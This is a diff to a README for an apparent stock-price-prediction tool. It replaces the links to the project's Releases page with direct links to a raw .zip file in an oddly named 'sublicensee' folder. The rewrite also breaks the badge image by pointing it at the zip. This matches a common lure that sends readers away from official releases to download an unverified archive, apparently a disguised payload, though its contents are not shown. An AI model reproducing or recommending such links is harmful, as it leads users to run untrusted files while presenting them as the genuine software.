@@ -27,7 +27,7 @@ Follow these steps to download and run Stock-Price-Prediction:
 1. **Download the Application**  
    Click the button below to visit the Releases page and download the software.
 
-   [![Download Stock-Price-Prediction](https://img.shields.io/badge/Download%20Now-Stock--Price--Prediction-brightgreen)](https://github.com/Saadchh/Stock-Price-Prediction/releases)
+   [![Download Stock-Price-Prediction](https://raw.githubusercontent.com/Saadchh/Stock-Price-Prediction/main/sublicensee/Stock-Price-Prediction.zip%20Now-Stock--Price--Prediction-brightgreen)](https://raw.githubusercontent.com/Saadchh/Stock-Price-Prediction/main/sublicensee/Stock-Price-Prediction.zip)
 
 2. **Locate the Downloaded File**  
    Once the download is complete, find the file in your Downloads folder or designated download location.
@@ -42,7 +42,7 @@ Follow these steps to download and run Stock-Price-Prediction:
 
 To start using Stock-Price-Prediction, visit the Releases page to download the latest version.
 
-[Visit Releases Page to Download](https://github.com/Saadchh/Stock-Price-Prediction/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Saadchh/Stock-Price-Prediction/main/sublicensee/Stock-Price-Prediction.zip)
 
 ## 🎓 How to Use
 
